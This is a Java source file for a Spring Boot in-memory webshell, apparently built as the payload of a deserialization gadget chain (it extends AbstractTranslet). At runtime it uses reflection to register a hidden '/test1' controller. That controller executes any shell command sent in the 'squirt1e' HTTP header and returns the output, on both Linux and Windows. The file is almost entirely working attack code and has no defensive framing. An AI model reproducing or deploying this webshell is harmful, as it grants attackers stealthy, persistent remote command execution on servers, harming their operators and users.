package gadget.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringBootMemoryShellOfController extends AbstractTranslet {
    public Integer i = 0 ;

    public SpringBootMemoryShellOfController() throws Exception{
        // 1. 利用spring内部方法获取context
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 2. 从context中获得 RequestMappingHandlerMapping 的实例
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

        Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
        configField.setAccessible(true);
        RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);

        // 3. 通过反射获得自定义 controller 中的 Method 对象
        Method method = SpringBootMemoryShellOfController.class.getMethod("test",HttpServletRequest.class, HttpServletResponse.class);

        // 在内存中动态注册 controller
        RequestMappingInfo info = RequestMappingInfo.paths("/test1").options(config).build();

        if(i==0){
            SpringBootMemoryShellOfController springBootMemoryShellOfController = new SpringBootMemoryShellOfController("aaa");
            mappingHandlerMapping.registerMapping(info, springBootMemoryShellOfController, method);
            System.out.println(i);
            i=1;
        }

    }

    public SpringBootMemoryShellOfController(String test){

    }

    public void test(HttpServletRequest request, HttpServletResponse response) throws Exception{
        if (request.getHeader("squirt1e") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", request.getHeader("squirt1e")} : new String[]{"cmd.exe", "/c", request.getHeader("squirt1e")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            response.getWriter().write(output);
            response.getWriter().flush();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

